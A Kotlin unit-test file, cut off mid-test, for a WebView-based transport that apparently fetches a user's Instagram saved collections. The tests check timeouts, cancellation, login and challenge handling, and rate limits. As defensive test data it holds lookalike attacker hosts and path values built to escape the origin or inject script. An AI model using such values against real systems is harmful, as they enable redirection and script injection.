package io.github.yuriimurha.reels.transport

import io.github.yuriimurha.reels.instagram.InstagramException
import io.github.yuriimurha.reels.instagram.web.ErrorReplySummary
import io.github.yuriimurha.reels.instagram.web.GraphQlQuery
import io.github.yuriimurha.reels.instagram.web.RawReply
import io.github.yuriimurha.reels.instagram.web.WebGraphQl
import io.github.yuriimurha.reels.instagram.web.WebHeaders
import io.github.yuriimurha.reels.instagram.web.classifyReply
import io.github.yuriimurha.reels.sync.pacing.InMemoryCooldownStore
import io.github.yuriimurha.reels.sync.pacing.InMemoryRequestLog
import io.github.yuriimurha.reels.sync.pacing.LONGEST_TRANSIENT_WAIT_MS
import io.github.yuriimurha.reels.sync.pacing.Pacer
import io.github.yuriimurha.reels.sync.pacing.PacingPolicy
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.CoroutineStart
import kotlinx.coroutines.Deferred
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.ExperimentalCoroutinesApi
import kotlinx.coroutines.TimeoutCancellationException
import kotlinx.coroutines.async
import kotlinx.coroutines.job
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.withTimeout
import kotlinx.coroutines.test.StandardTestDispatcher
import kotlinx.coroutines.test.TestScope
import kotlinx.coroutines.test.advanceTimeBy
import kotlinx.coroutines.test.currentTime
import kotlinx.coroutines.test.runCurrent
import kotlinx.coroutines.test.runTest
import kotlinx.coroutines.test.testTimeSource
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import java.io.File
import java.io.IOException
import kotlin.coroutines.cancellation.CancellationException
import kotlin.random.Random
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFailsWith
import kotlin.test.assertFalse
import kotlin.test.assertIs
import kotlin.test.assertNull
import kotlin.test.assertTrue
import kotlin.test.fail

@OptIn(ExperimentalCoroutinesApi::class)
class WebViewTransportTest {
    private val home = "https://www.instagram.com/"

    /** A page that records what it is asked to do and lets the test play the part of the site. */
    private class FakeWebPage(
        private val landing: String = "https://www.instagram.com/",
        private val loadError: Exception? = null,
        /** When set, [load] waits for it, the way a slow page does. */
        private val loadGate: CompletableDeferred<Unit>? = null,
        /** Like the real page: destroying it fails a load in progress. */
        private val destroyFailsTheLoad: Boolean = true,
        /** When set, [evaluate] throws it (after recording the script). */
        var evaluateError: Exception? = null,
    ) : WebPage {
        val loaded = mutableListOf<String>()
        val evaluated = mutableListOf<String>()
        var destroyed = false

        /** What [currentUrl] says. Null before the load finishes, like a WebView with nothing shown. */
        var url: String? = null

        /** When set, [currentUrl] throws it, like a WebView that fails on being asked where it is. */
        var urlError: Exception? = null
        private var listener: ((String) -> Unit)? = null
        private var goneListener: (() -> Unit)? = null

        init {
            // The page itself finishes loading even when nobody waits for it any more (a cancelled caller).
            loadGate?.invokeOnCompletion { cause -> if (cause == null) url = landing }
        }

        override suspend fun load(url: String): String {
            loaded += url
            loadGate?.await()
            loadError?.let { throw it }
            this.url = landing
            return landing
        }

        override fun currentUrl(): String? {
            urlError?.let { throw it }
            return url
        }

        override fun evaluate(script: String) {
            evaluated += script
            evaluateError?.let { throw it }
        }

        override fun onMessage(listener: (String) -> Unit) {
            this.listener = listener
        }

        override fun onGone(listener: () -> Unit) {
            goneListener = listener
        }

        override fun destroy() {
            destroyed = true
            if (destroyFailsTheLoad) loadGate?.completeExceptionally(IOException("destroyed"))
        }

        fun post(json: String) = checkNotNull(listener) { "the transport never set a listener" }(json)

        /** The renderer dies: the page has no URL any more and says so. */
        fun die() {
            url = null
            goneListener?.invoke()
        }

        /** The calls this page was asked to make (everything evaluated except the injected script and the aborts). */
        val fetches: List<String> get() = evaluated.filter { it.startsWith("window.__igFetch") }
    }

    /** Hands the transport its pages in order (then plain healthy ones), and can fail the first creations. */
    private class Pages(vararg pages: FakeWebPage, createErrors: List<Exception> = emptyList()) {
        private val queue = ArrayDeque(pages.toList())
        private val errors = ArrayDeque(createErrors)
        val created = mutableListOf<FakeWebPage>()
        var attempts = 0

        fun create(): WebPage {
            attempts++
            errors.removeFirstOrNull()?.let { throw it }
            return (queue.removeFirstOrNull() ?: FakeWebPage()).also { created += it }
        }
    }

    private fun TestScope.transport(
        pages: Pages,
        callTimeoutMs: Long = 30_000,
        loadTimeoutMs: Long = 30_000,
        log: ((String) -> Unit)? = null,
    ) = WebViewTransport(
        pages::create, home, SCRIPT, StandardTestDispatcher(testScheduler), callTimeoutMs, loadTimeoutMs,
        // The background scope: virtual time drives the idle timer, and a timer still pending when a test ends is cancelled
        // with it (the test scope itself would wait for it, and run it).
        idleScope = backgroundScope, log = log, timeSource = testTimeSource,
    )

    /** A call on the transport's current page, answered at once. Returns what the caller got. */
    private suspend fun TestScope.completedCall(transport: WebViewTransport, pages: Pages, id: Long): RawReply {
        val pending = call(transport, "api/v1/collections/list/")
        runCurrent()
        pages.created.last().post(reply(id))
        return pending.await().getOrThrow()
    }

    /** Idle timers waiting in the background scope (the one the transport is given). */
    private fun TestScope.pendingIdleTimers(): Int = backgroundScope.coroutineContext.job.children.count { it.isActive }

    private fun TestScope.call(transport: WebViewTransport, path: String): Deferred<Result<RawReply>> =
        async { runCatching { transport.get(path) } }

    private fun reply(
        id: Long,
        code: Int = 200,
        contentType: String? = "application/json",
        body: String? = "{}",
        redirected: Boolean = false,
    ): String = buildJsonObject {
        put("id", id)
        put("code", code)
        put("contentType", contentType)
        put("body", body)
        put("redirected", redirected)
    }.toString()

    /** The exception and its causes. (Coroutine stack-trace recovery wraps a rethrown exception in a copy of itself.) */
    private fun Throwable.causes(): List<Throwable> = generateSequence(this) { it.cause }.toList()

    private fun fetchOf(id: Long, quotedPath: String) = "window.__igFetch && window.__igFetch($id,$quotedPath)"

    private fun abortOf(id: Long) = "window.__igAbort && window.__igAbort($id)"

    /** The id of the last fetch [this] page was asked to make. */
    private val FakeWebPage.lastFetchId: Long get() = fetches.last().substringAfter("__igFetch(").substringBefore(',').toLong()

    /** Runs [block] as a caller that is cancelled later, and keeps what it ended with: a cancelled caller must end cancelled. */
    private class Caller {
        var ended: Throwable? = null

        suspend fun run(block: suspend () -> Unit) {
            try {
                block()
            } catch (t: Throwable) {
                ended = t
                throw t
            }
        }
    }

    @Test
    fun aCallLoadsTheHomePageOnceAndSendsOneFetch() = runTest {
        val pages = Pages()
        val transport = transport(pages)

        val first = call(transport, "api/v1/collections/list/")
        runCurrent()
        val page = pages.created.single()
        assertEquals(listOf(home), page.loaded)
        // The script goes in, then exactly one fetch for this call.
        assertEquals(listOf(SCRIPT, fetchOf(1, "\"api/v1/collections/list/\"")), page.evaluated)

        page.post(reply(1, body = """{"status":"ok"}"""))
        val result = first.await().getOrThrow()
        assertEquals(200, result.code)
        assertEquals("application/json", result.contentType)
        assertEquals("""{"status":"ok"}""", result.body)
        assertFalse(result.redirected)

        // A second call reuses the page: no second load, one more fetch. The script goes in again before it (it is a no-op
        // when the page still has it, and the only way back when a navigation wiped it).
        val second = call(transport, "api/v1/feed/saved/posts/")
        runCurrent()
        assertEquals(1, pages.created.size)
        assertEquals(listOf(home), page.loaded)
        assertEquals(
            listOf(SCRIPT, fetchOf(1, "\"api/v1/collections/list/\""), SCRIPT, fetchOf(2, "\"api/v1/feed/saved/posts/\"")),
            page.evaluated,
        )
        page.post(reply(2))
        assertEquals(200, second.await().getOrThrow().code)
        assertFalse(page.destroyed)
    }

    @Test
    fun repliesAreMatchedByIdAndConcurrentCallsAreRefused() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        val a = call(transport, "api/v1/collections/list/")
        runCurrent()
        val page = pages.created.single()

        // A second call while the first is in flight is refused, and sends nothing.
        val b = call(transport, "api/v1/feed/saved/posts/")
        runCurrent()
        assertIs<InstagramException.Transient>(b.await().exceptionOrNull())
        assertEquals(1, page.fetches.size)

        // Replies for another id (a later call, a made-up one) are not the awaited one.
        page.post(reply(2, body = "not for a"))
        page.post(reply(0, body = "not for a"))
        runCurrent()
        assertTrue(a.isActive)
        page.post(reply(1, body = "for a"))
        assertEquals("for a", a.await().getOrThrow().body)

        // The next call has the next id, and a repeat of the old reply does not answer it.
        val c = call(transport, "api/v1/feed/saved/posts/")
        runCurrent()
        assertEquals(fetchOf(2, "\"api/v1/feed/saved/posts/\""), page.fetches.last())
        page.post(reply(1, body = "stale"))
        runCurrent()
        assertTrue(c.isActive)
        page.post(reply(2, body = "for c"))
        assertEquals("for c", c.await().getOrThrow().body)
        // And one nobody waits for any more is just dropped: it answers neither now nor the next call.
        page.post(reply(2, body = "late"))
        runCurrent()
        val d = call(transport, "api/v1/feed/saved/posts/")
        runCurrent()
        page.post(reply(2, body = "late again"))
        runCurrent()
        assertTrue(d.isActive, "a late reply answers no later call")
        page.post(reply(3, body = "for d"))
        assertEquals("for d", d.await().getOrThrow().body)
    }

    @Test
    fun aPageThatLandsOnLoginMakesNoCall() = runTest {
        val pages = Pages(FakeWebPage(landing = "https://www.instagram.com/accounts/login/?next=%2F"))
        val transport = transport(pages)

        assertIs<InstagramException.LoginRequired>(call(transport, "api/v1/collections/list/").await().exceptionOrNull())
        val page = pages.created.single()
        assertEquals(emptyList(), page.evaluated)
        assertTrue(page.destroyed)

        // Until reset every call is LoginRequired: the page is not loaded again and nothing is evaluated.
        assertIs<InstagramException.LoginRequired>(call(transport, "api/v1/feed/saved/posts/").await().exceptionOrNull())
        assertEquals(1, pages.attempts)
        assertEquals(emptyList(), page.evaluated)

        // After a reset (the owner logged in) the next call loads a fresh page and goes through.
        transport.reset()
        val after = call(transport, "api/v1/collections/list/")
        runCurrent()
        assertEquals(2, pages.created.size)
        pages.created.last().post(reply(1))
        assertEquals(200, after.await().getOrThrow().code)
    }

    @Test
    fun aPageThatLandsOnAChallengeMakesNoCall() = runTest {
        for (landing in listOf(
            "https://www.instagram.com/challenge/",
            "https://www.instagram.com/challenge/action/AXabc/?next=%2F",
            "https://www.instagram.com/accounts/suspended/",
        )) {
            val pages = Pages(FakeWebPage(landing = landing))
            val transport = transport(pages)

            val error = assertIs<InstagramException.ChallengeRequired>(call(transport, "api/v1/collections/list/").await().exceptionOrNull())
            // The landing URL is never kept: it carries a nonce.
            assertNull(error.challengeUrl)
            assertEquals(emptyList(), pages.created.single().evaluated)
            assertIs<InstagramException.ChallengeRequired>(call(transport, "api/v1/collections/list/").await().exceptionOrNull())
            assertEquals(1, pages.attempts, landing)
        }
    }

    @Test
    fun aPageThatLandsOnAnotherHostIsTransientAndIsDropped() = runTest {
        for (landing in listOf(
            "https://example.invalid/",
            "https://example.invalid/accounts/login/",
            "https://www.instagram.com.evil.example/accounts/login/",
            "http://www.instagram.com/",
            "not a url at all ::",
        )) {
            val pages = Pages(FakeWebPage(landing = landing))
            val transport = transport(pages)

            assertIs<InstagramException.Transient>(call(transport, "api/v1/collections/list/").await().exceptionOrNull(), landing)
            val stray = pages.created.single()
            assertEquals(emptyList(), stray.evaluated, landing)
            assertTrue(stray.destroyed, landing)

            // Not a verdict on the account: the next call starts over with a fresh page.
            val next = call(transport, "api/v1/collections/list/")
            runCurrent()
            assertEquals(2, pages.created.size, landing)
            pages.created.last().post(reply(1))
            assertEquals(200, next.await().getOrThrow().code)
        }
    }

    @Test
    fun aRedirectMessageBecomesARedirectedReply() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        val pending = call(transport, "api/v1/media/3100000000000000001/info/")
        runCurrent()
        pages.created.single().post("""{"id":1,"code":0,"contentType":null,"body":null,"redirected":true}""")

        val result = pending.await().getOrThrow()
        assertTrue(result.redirected)
        assertEquals(0, result.code)
        assertNull(result.body)
        // Through this transport a login bounce is just an opaque redirect: a challenge with no URL.
        val failure = assertIs<InstagramException.ChallengeRequired>(classifyReply(result))
        assertNull(failure.challengeUrl)
    }

    @Test
    fun aNetworkFailureMessageIsTransient() = runTest {
        val pages = Pages()
        val transport = transport(pages)

        val first = call(transport, "api/v1/collections/list/")
        runCurrent()
        val page = pages.created.single()
        page.post("""{"id":1,"code":-1,"contentType":null,"body":null,"redirected":false}""")
        assertIs<InstagramException.Transient>(first.await().exceptionOrNull())

        // Not a status either: a code outside HTTP's 100..599 is never handed to the classifier (T11: 600 included).
        var id = 1L
        for (code in listOf(0, 99, 600, 1000)) {
            val unreadable = call(transport, "api/v1/collections/list/")
            runCurrent()
            page.post(reply(++id, code = code))
            assertIs<InstagramException.Transient>(unreadable.await().exceptionOrNull(), "code $code")
        }

        // The page itself is fine and is kept.
        val third = call(transport, "api/v1/collections/list/")
        runCurrent()
        page.post(reply(++id))
        assertEquals(200, third.await().getOrThrow().code)
        assertEquals(1, pages.created.size)
        assertFalse(page.destroyed)
    }

    @Test
    fun aMalformedMessageIsIgnored() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        val pending = call(transport, "api/v1/collections/list/")
        runCurrent()
        val page = pages.created.single()

        for (junk in listOf("not json", "[]", "null", "", """{"id":1}""", """{"id":1,"code":"x"}""", """{"code":200,"body":"{}"}""")) {
            page.post(junk)
        }
        runCurrent()
        // None of it answered the call: it is still waiting, and still times out.
        assertTrue(pending.isActive)
        advanceTimeBy(30_000)
        runCurrent()
        assertIs<InstagramException.Transient>(pending.await().exceptionOrNull())
    }

    @Test
    fun theCallTimesOutAndDropsThePage() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        val pending = call(transport, "api/v1/collections/list/")
        runCurrent()
        val stuck = pages.created.single()

        advanceTimeBy(29_999)
        runCurrent()
        assertTrue(pending.isActive)
        advanceTimeBy(1)
        runCurrent()
        assertIs<InstagramException.Transient>(pending.await().exceptionOrNull())
        assertEquals(30_000, currentTime)
        // A stuck page is not reused.
        assertTrue(stuck.destroyed)

        val next = call(transport, "api/v1/collections/list/")
        runCurrent()
        assertEquals(2, pages.created.size)
        val fresh = pages.created.last()
        assertEquals(listOf(SCRIPT, fetchOf(2, "\"api/v1/collections/list/\"")), fresh.evaluated)
        // Whatever the dropped page still says is not heard, even for an id that is now awaited.
        stuck.post(reply(2, body = "from the dropped page"))
        runCurrent()
        assertTrue(next.isActive)
        fresh.post(reply(2, body = "from the new page"))
        assertEquals("from the new page", next.await().getOrThrow().body)
    }

    @Test
    fun destroyCancelsTheCallInFlight() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        val pending = call(transport, "api/v1/collections/list/")
        runCurrent()
        val page = pages.created.single()

        transport.reset()
        runCurrent()
        // Answered at once, not at the timeout.
        assertIs<InstagramException.Transient>(pending.await().exceptionOrNull())
        assertEquals(0, currentTime)
        assertTrue(page.destroyed)

        // The next call creates and loads a new page.
        val next = call(transport, "api/v1/collections/list/")
        runCurrent()
        assertEquals(2, pages.created.size)
        pages.created.last().post(reply(2))
        assertEquals(200, next.await().getOrThrow().code)
    }

    @Test
    fun destroyDuringThePageLoadFailsTheCallAtOnce() = runTest {
        for (destroyFailsTheLoad in listOf(true, false)) {
            val gate = CompletableDeferred<Unit>()
            val pages = Pages(FakeWebPage(loadGate = gate, destroyFailsTheLoad = destroyFailsTheLoad))
            val transport = transport(pages)
            val pending = call(transport, "api/v1/collections/list/")
            runCurrent()
            val page = pages.created.single()
            assertEquals(listOf(home), page.loaded)

            transport.reset()
            // A page that loads anyway after it was destroyed is not used.
            gate.complete(Unit)
            runCurrent()
            assertIs<InstagramException.Transient>(pending.await().exceptionOrNull())
            assertEquals(emptyList(), page.evaluated)
            assertTrue(page.destroyed)
            assertEquals(0, currentTime)
        }
    }

    @Test
    fun aPageThatCannotBeCreatedFailsTransient() = runTest {
        val pages = Pages(createErrors = listOf(IllegalStateException("no WebView provider")))
        val transport = transport(pages)

        val error = assertIs<InstagramException.Transient>(call(transport, "api/v1/collections/list/").await().exceptionOrNull())
        assertTrue(error.causes().any { it is IllegalStateException }, "the Transient keeps what went wrong")
        assertTrue(pages.created.isEmpty())

        // Nothing is remembered: the next call tries to create the page again.
        val next = call(transport, "api/v1/collections/list/")
        runCurrent()
        assertEquals(2, pages.attempts)
        pages.created.single().post(reply(1))
        assertEquals(200, next.await().getOrThrow().code)
    }

    @Test
    fun aPageThatFailsToLoadFailsTransientAndIsDropped() = runTest {
        val pages = Pages(FakeWebPage(loadError = IOException("net::ERR_INTERNET_DISCONNECTED")))
        val transport = transport(pages)

        val error = assertIs<InstagramException.Transient>(call(transport, "api/v1/collections/list/").await().exceptionOrNull())
        assertTrue(error.causes().any { it is IOException }, "the Transient keeps what went wrong")
        val broken = pages.created.single()
        assertTrue(broken.destroyed)
        assertEquals(emptyList(), broken.evaluated)

        val next = call(transport, "api/v1/collections/list/")
        runCurrent()
        assertEquals(2, pages.created.size)
        pages.created.last().post(reply(1))
        assertEquals(200, next.await().getOrThrow().code)
    }

    @Test
    fun aPageThatNeverFinishesLoadingTimesOutTransient() = runTest {
        val pages = Pages(FakeWebPage(loadGate = CompletableDeferred()))
        val transport = transport(pages, loadTimeoutMs = 20_000)
        val pending = call(transport, "api/v1/collections/list/")
        runCurrent()

        advanceTimeBy(19_999)
        runCurrent()
        assertTrue(pending.isActive)
        advanceTimeBy(1)
        runCurrent()
        assertIs<InstagramException.Transient>(pending.await().exceptionOrNull())
        assertEquals(20_000, currentTime)
        val slow = pages.created.single()
        assertTrue(slow.destroyed)
        assertEquals(emptyList(), slow.evaluated)
    }

    @Test
    fun aCancelledCallFreesTheTransportAndItsLateReplyIsIgnored() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        val abandoned = launch { transport.get("api/v1/collections/list/") }
        runCurrent()
        val page = pages.created.single()
        abandoned.cancel()
        runCurrent()

        val next = call(transport, "api/v1/feed/saved/posts/")
        runCurrent()
        // Same page: a cancelled call is not a stuck page. The new call has a new id.
        assertEquals(1, pages.created.size)
        assertEquals(fetchOf(2, "\"api/v1/feed/saved/posts/\""), page.fetches.last())
        // R105: the cancelled call's fetch was aborted in the page before the next one was sent, so no two of the app's API
        // requests are ever open at once.
        assertEquals(
            listOf(SCRIPT, fetchOf(1, "\"api/v1/collections/list/\""), abortOf(1), SCRIPT, fetchOf(2, "\"api/v1/feed/saved/posts/\"")),
            page.evaluated,
        )
        page.post(reply(1, body = "late reply of the cancelled call"))
        runCurrent()
        assertTrue(next.isActive)
        page.post(reply(2, body = "answer"))
        assertEquals("answer", next.await().getOrThrow().body)
    }

    /** R105: the abort is a courtesy to the server. It failing must never turn the caller's cancellation into anything else. */
    @Test
    fun aCancelledCallEndsInItsCancellationEvenWhenTheAbortFails() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        val caller = Caller()
        val abandoned = launch { caller.run { transport.get("api/v1/collections/list/") } }
        runCurrent()
        val page = pages.created.single()
        page.evaluateError = IllegalStateException("evaluateJavascript failed")

        abandoned.cancel()
        runCurrent()

        assertIs<CancellationException>(caller.ended)
        assertTrue(abandoned.isCancelled)
        assertEquals(abortOf(1), page.evaluated.last(), "the abort was tried")
    }

    /** R105: a page that is no longer the current one (its renderer died) is not asked to abort anything: it is gone. */
    @Test
    fun aCancelledCallWhosePageIsGoneEvaluatesNoAbortOnIt() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        val abandoned = launch { transport.get("api/v1/collections/list/") }
        runCurrent()
        val page = pages.created.single()

        // In one turn of the main thread: the renderer dies (the call is woken), then the caller is cancelled before it runs.
        page.die()
        abandoned.cancel()
        runCurrent()

        assertTrue(abandoned.isCancelled)
        assertTrue(page.destroyed)
        assertEquals(listOf(SCRIPT, fetchOf(1, "\"api/v1/collections/list/\"")), page.evaluated)
    }

    @Test
    fun thePathIsJsonQuotedInTheCall() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        val pending = call(transport, "api/v1/x/?q=\"</script>\\")
        runCurrent()
        assertEquals(fetchOf(1, "\"api/v1/x/?q=\\\"</script>\\\\\""), pages.created.single().fetches.single())
        pages.created.single().post(reply(1))
        pending.await()
    }

    @Test
    fun aPathThatCouldLeaveTheOriginIsRefusedBeforeAnyPageIsCreated() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        // The script prefixes "/", so a slash or backslash first would make a URL to another host; a tab or a newline in front
        // of one is dropped by URL parsing and does the same; and nothing but letters and digits starts a path of ours.
        val refused = listOf(
            "", "/api/v1/x/", "//example.invalid/x", "\\example.invalid\\x", "\t/example.invalid/x", "\n/x", "\r\n//example.invalid/x",
            " api/v1/x/", ".x", "api/v1/x/\n/y", "api/v1/x\t", "api/v1/x\r",
        )
        for (path in refused) {
            assertFailsWith<IllegalArgumentException>(path) { transport.get(path) }
        }
        assertEquals(0, pages.attempts)
    }

    @Test
    fun aHomePageAnsweredWithRateLimitingIsRateLimitedAndMakesNoCall() = runTest {
        val pages = Pages(FakeWebPage(loadError = PageHttpError(429)))
        val transport = transport(pages)

        assertIs<InstagramException.RateLimited>(call(transport, "api/v1/collections/list/").await().exceptionOrNull())
        val refused = pages.created.single()
        // The 429 page finished loading as far as the browser is concerned: nothing may be fetched from it.
        assertEquals(emptyList(), refused.evaluated)
        assertTrue(refused.destroyed)

        // Nothing is remembered: the next call starts over with a new page.
        val next = call(transport, "api/v1/collections/list/")
        runCurrent()
        assertEquals(2, pages.created.size)
        pages.created.last().post(reply(1))
        assertEquals(200, next.await().getOrThrow().code)
    }

    @Test
    fun aHomePageAnsweredWithAnotherHttpErrorIsTransientAndMakesNoCall() = runTest {
        for (status in listOf(503, 500, 403, 404)) {
            val pages = Pages(FakeWebPage(loadError = PageHttpError(status)))
            val transport = transport(pages)

            val error = assertIs<InstagramException.Transient>(call(transport, "api/v1/collections/list/").await().exceptionOrNull(), "$status")
            assertTrue(error.causes().any { it is PageHttpError && it.code == status }, "the Transient keeps the status")
            val refused = pages.created.single()
            assertEquals(emptyList(), refused.evaluated, "$status")
            assertTrue(refused.destroyed, "$status")
        }
    }

    @Test
    fun aPageThatMovesToLoginOrAChallengeBetweenCallsMakesNoFurtherCall() = runTest {
        for ((moved, expected) in listOf(
            "https://www.instagram.com/accounts/login/?next=%2F" to InstagramException.LoginRequired::class,
            "https://www.instagram.com/challenge/action/AXabc/" to InstagramException.ChallengeRequired::class,
            "https://www.instagram.com/accounts/suspended/" to InstagramException.ChallengeRequired::class,
        )) {
            val pages = Pages()
            val transport = transport(pages)
            val first = call(transport, "api/v1/collections/list/")
            runCurrent()
            val page = pages.created.single()
            page.post(reply(1))
            first.await().getOrThrow()
            val sent = page.evaluated.toList()

            // The site moved itself (a pushState, a client-side redirect): the page's landing is checked before every call.
            page.url = moved
            val failure = call(transport, "api/v1/feed/saved/posts/").await().exceptionOrNull()
            assertEquals(expected, failure!!::class, moved)
            // Checked before anything is injected: not the script, not a fetch.
            assertEquals(sent, page.evaluated, moved)
            assertTrue(page.destroyed, moved)

            // Remembered until reset, with no new page.
            assertEquals(expected, call(transport, "api/v1/feed/saved/posts/").await().exceptionOrNull()!!::class, moved)
            assertEquals(1, pages.attempts, moved)
            transport.reset()
            val after = call(transport, "api/v1/collections/list/")
            runCurrent()
            assertEquals(2, pages.created.size, moved)
            pages.created.last().post(reply(2))
            assertEquals(200, after.await().getOrThrow().code)
        }
    }

    @Test
    fun aPageThatMovesToAnotherSiteIsDroppedAndTransient() = runTest {
        for (moved in listOf(
            "https://www.facebook.com/login/",
            "https://www.meta.com/",
            "https://www.instagram.com.evil.example/",
            "https://www.instagram.com:8443/",
            "http://www.instagram.com/",
            "not a url at all ::",
        )) {
            val pages = Pages()
            val transport = transport(pages)
            val first = call(transport, "api/v1/collections/list/")
            runCurrent()
            val page = pages.created.single()
            page.post(reply(1))
            first.await().getOrThrow()
            val sent = page.evaluated.toList()

            page.url = moved
            assertIs<InstagramException.Transient>(call(transport, "api/v1/feed/saved/posts/").await().exceptionOrNull(), moved)
            assertEquals(sent, page.evaluated, moved)
            assertTrue(page.destroyed, moved)

            // Not a verdict on the account: the next call starts over.
            val next = call(transport, "api/v1/feed/saved/posts/")
            runCurrent()
            assertEquals(2, pages.created.size, moved)
            pages.created.last().post(reply(2))
            assertEquals(200, next.await().getOrThrow().code)
        }
    }

    @Test
    fun theDefaultPortAndAnotherPathOnTheSameSiteAreStillTheInstagramPage() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        val first = call(transport, "api/v1/collections/list/")
        runCurrent()
        val page = pages.created.single()
        page.post(reply(1))
        first.await().getOrThrow()

        for ((n, moved) in listOf("https://www.instagram.com:443/explore/", "https://WWW.Instagram.com/accounts/onetap/?next=%2F").withIndex()) {
            page.url = moved
            val next = call(transport, "api/v1/feed/saved/posts/")
            runCurrent()
            page.post(reply(2L + n))
            assertEquals(200, next.await().getOrThrow().code, moved)
        }
        assertEquals(1, pages.created.size)
        assertFalse(page.destroyed)
    }

    @Test
    fun aPageWithoutAUrlIsDroppedAndTransient() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        val first = call(transport, "api/v1/collections/list/")
        runCurrent()
        val page = pages.created.single()
        page.post(reply(1))
        first.await().getOrThrow()
        val sent = page.evaluated.toList()

        // A WebView whose renderer is gone has no URL.
        page.url = null
        assertIs<InstagramException.Transient>(call(transport, "api/v1/feed/saved/posts/").await().exceptionOrNull())
        assertEquals(sent, page.evaluated)
        assertTrue(page.destroyed)

        val next = call(transport, "api/v1/feed/saved/posts/")
        runCurrent()
        assertEquals(2, pages.created.size)
        pages.created.last().post(reply(2))
        assertEquals(200, next.await().getOrThrow().code)
    }

    @Test
    fun aPageThatFailsToSayWhereItIsIsDroppedAndTransientAndNothingIsEvaluated() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        val first = call(transport, "api/v1/collections/list/")
        runCurrent()
        val page = pages.created.single()
        page.post(reply(1))
        first.await().getOrThrow()
        val sent = page.evaluated.toList()

        // A WebView that throws when asked for its URL (a dead renderer, a destroyed view) is not a page to run anything in.
        page.urlError = IllegalStateException("getUrl failed")
        val error = assertIs<InstagramException.Transient>(call(transport, "api/v1/feed/saved/posts/").await().exceptionOrNull())
        assertTrue(error.causes().any { it is IllegalStateException }, "the Transient keeps what went wrong")
        assertEquals(sent, page.evaluated, "nothing is evaluated on a page that cannot say where it is")
        assertTrue(page.destroyed)

        // Not a verdict on the account: the next call starts over on a new page.
        val next = call(transport, "api/v1/feed/saved/posts/")
        runCurrent()
        assertEquals(2, pages.created.size)
        pages.created.last().post(reply(2))
        assertEquals(200, next.await().getOrThrow().code)
    }

    @Test
    fun theScriptIsInjectedBeforeEveryFetch() = runTest {
        val pages = Pages()
        val transport = transport(pages)
        for (id in 1L..3L) {
            val pending = call(transport, "api/v1/collections/list/")
            runCurrent()
            pages.created.single().post(reply(id))
            pending.await().getOrThrow()
        }
        // A navigation can wipe window.__igFetch at any time; the script's own guard makes a second injection a no-op.
        val evaluated = pages.created.single().evaluated
        assertEquals(6, evaluated.size)
        assertEquals(listOf(SCRIPT, SCRIPT, SCRIPT), evaluated.filterIndexed { i, _ -> i % 2 == 0 })
        assertEquals(listOf(1L, 2L, 3L), evaluated.filterIndexed { i, _ -> i % 2 == 1 }.map { it.substringAfter("__igFetch(").substringBefore(',').toLong() })
    }

    /**
     * R104: a caller cancelled while the home page loads (the viewer's `collectLatest` at a swipe) does not drop the page. It
     * waits for the load, under the load's own bound, and the landing is checked exactly as for a caller that waited: here it
     * is the login page, so the page goes and the verdict is remembered. The caller still ends with its cancellation, never
     * with the verdict (a cancelled coroutine that throws anything else fails its parent scope).
     */
    @Test
    fun aCallCancelledWhileTheHomePageLoadsStillChecksTheLandingBeforeAnyReuse() = runTest {
        val gate = CompletableDeferred<Unit>()
        val pages = Pages(FakeWebPage(landing = "https://www.instagram.com/accounts/login/", loadGate = gate, destroyFailsTheLoad = false))
        val transport = transport(pages)
        val caller = Caller()
        val abandoned = launch { caller.run { transport.get("api/v1/collections/list/") } }
        runCurrent()
        val first = pages.created.single()
        assertEquals(listOf(home), first.loaded)

        abandoned.cancel()
        runCurrent()
        assertFalse(abandoned.isCompleted, "the cancelled caller waits for the load")
        assertFalse(first.destroyed, "the page is not dropped while it loads")

        gate.complete(Unit)
        runCurrent()
        assertTrue(abandoned.isCancelled)
        assertIs<CancellationException>(caller.ended)
        // The login landing is a verdict like any other: the page goes, nothing was evaluated, and it is remembered.
        assertTrue(first.destroyed)
        assertEquals(emptyList(), first.evaluated)
        assertIs<InstagramException.LoginRequired>(call(transport, "api/v1/collections/list/").await().exceptionOrNull())
        assertEquals(1, pages.attempts)
        assertEquals(emptyList(), first.evaluated)
    }

    /** R104: a good page a cancelled caller waited for is kept, with its idle timer, and serves the next call without a new load. */
    @Test
    fun aCallCancelledWhileTheHomePageLoadsKeepsAGoodPageForTheNextCall() = runTest {
        val gate = CompletableDeferred<Unit>()
        val pages = Pages(FakeWebPage(loadGate = gate))
        val transport = transport(pages)
        val caller = Caller()
        val abandoned = launch { caller.run { transport.get("api/v1/collections/list/") } }
        runCurrent()
        val page = pages.created.single()
        abandoned.cancel()
        runCurrent()

        advanceTimeBy(5_000)
        gate.complete(Unit)
        runCurrent()
        assertTrue(abandoned.isCancelled)
        assertIs<CancellationException>(caller.ended)
        assertFalse(page.destroyed)
        assertEquals(emptyList(), page.evaluated, "nothing is fetched for a caller that is gone")
        assertEquals(1, pendingIdleTimers(), "the kept page closes by itself if nothing uses it")

        assertEquals(200, completedCall(transport, pages, 1).code)
        assertEquals(1, pages.created.size)
        assertEquals(listOf(home), page.loaded)
    }

    /**
     * C2: the viewer's `collectLatest` cancels the link refresh at every swipe, also while the home page loads. When a cancelled
     * load dropped its page, three swipes during cold loads used up [WebViewTransport.MAX_PAGES] and every refresh after them
     * failed "page limit" until a sync or a check. Now the swipes cost one page between them.
     */
    @Test
    fun callsCancelledWhileThePageLoadsUseOnePageAndTheNextCallGoesThrough() = runTest {
        val gates = List(WebViewTransport.MAX_PAGES) { CompletableDeferred<Unit>() }
        val pages = Pages(*Array(gates.size) { FakeWebPage(loadGate = gates[it]) })
